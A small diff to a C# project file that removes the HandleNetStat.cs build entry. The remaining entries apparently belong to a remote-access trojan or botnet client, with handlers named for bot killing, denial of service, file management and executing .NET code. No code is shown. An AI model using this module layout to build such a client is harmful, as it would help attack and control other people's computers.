@@ -78,7 +78,6 @@
     <Compile Include="Handle Packet\HandleBotKiller.cs" />
     <Compile Include="Handle Packet\HandleDos.cs" />
     <Compile Include="Handle Packet\HandleFileManager.cs" />
-    <Compile Include="Handle Packet\HandleNetStat.cs" />
     <Compile Include="Handle Packet\HandlerExecuteDotNetCode.cs" />
     <Compile Include="Handle Packet\HandleThumbnails.cs" />
     <Compile Include="Handle Packet\HandlePcOptions.cs" />
